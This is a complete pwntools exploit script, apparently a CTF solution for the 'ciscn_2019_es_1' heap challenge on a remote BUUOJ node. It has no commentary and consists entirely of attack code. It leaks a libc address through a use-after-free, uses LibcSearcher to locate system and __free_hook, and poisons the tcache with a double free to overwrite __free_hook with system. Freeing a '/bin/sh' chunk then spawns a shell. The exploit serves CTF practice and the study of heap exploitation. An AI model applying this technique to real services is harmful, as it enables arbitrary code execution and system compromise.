from pwn import *
from LibcSearcher import *
context.log_level = 'debug'

# io = process('./ciscn_2019_es_1')
io = remote('node4.buuoj.cn', 28589)

sla = lambda x, y: io.sendlineafter(x, y)

def add(size, name, phone):
	sla(b'choice:', b'1')
	sla(b'Please input the size of compary\'s name\n', str(size).encode())
	sla(b'please input name:\n', name)
	sla(b'please input compary call:\n', phone)

def delete(idx):
	sla(b'choice:', b'3')
	sla(b'Please input the index:\n', str(idx).encode())
	
def show(idx):
	sla(b'choice:', b'2')
	sla(b'Please input the index:\n', str(idx).encode())

add(0x440, b'a', b'a')
add(0x440, b'a', b'a')
add(0x50, b'/bin/sh\x00', b'a')
delete(0)
show(0)
io.recvuntil(b'name:\n')
main_arena = u64(io.recv(6) + b'\x00\x00') - 96
__malloc_hook = main_arena - 0x10
log.info('__malloc_hook: ' + hex(__malloc_hook))
libc = LibcSearcher('__malloc_hook', __malloc_hook)
base = __malloc_hook - libc.dump('__malloc_hook')
system = base + libc.dump('system')
binsh = base + libc.dump('str_bin_sh')
log.info('libc base: ' + hex(base))
log.info('system: ' + hex(system))
__free_hook = base + libc.dump('__free_hook')

add(0x30, b'b', b'b')
add(0x30, b'b', b'b')
delete(3)
delete(3)

add(0x30, p64(__free_hook), b'b')
add(0x30, b'b', b'b')
add(0x30, p64(system), b'b')
delete(2)
io.interactive()
